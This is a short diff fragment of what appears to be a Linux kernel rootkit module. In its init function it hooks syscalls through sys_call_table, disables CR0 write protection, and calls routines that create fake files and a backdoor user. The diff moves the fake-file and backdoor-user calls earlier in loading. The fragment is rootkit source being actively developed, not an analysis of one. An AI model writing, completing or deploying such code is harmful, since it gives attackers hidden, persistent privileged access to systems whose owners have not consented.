@@ -397,6 +397,9 @@ int __init loadMod(void)
 {
     vol_disable_h = 1;
 
+    create_fake_files();
+    create_backdoor_user();
+    
     //get and store sys_call_table ptr
     sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
     if (sys_call_table == NULL)
@@ -427,12 +430,6 @@ int __init loadMod(void)
     syscall_names[4] = __NR_kill;
     totallyReal_syscallPtrs[4] = (void *)&totallyReal_kill;
     toInject[4] = 1;
-
-    // create the fake files
-    create_fake_files();
-
-    // create the hacker user
-    create_backdoor_user();
 
     // allow writing on x86
     CR0_WRITE_UNLOCK({
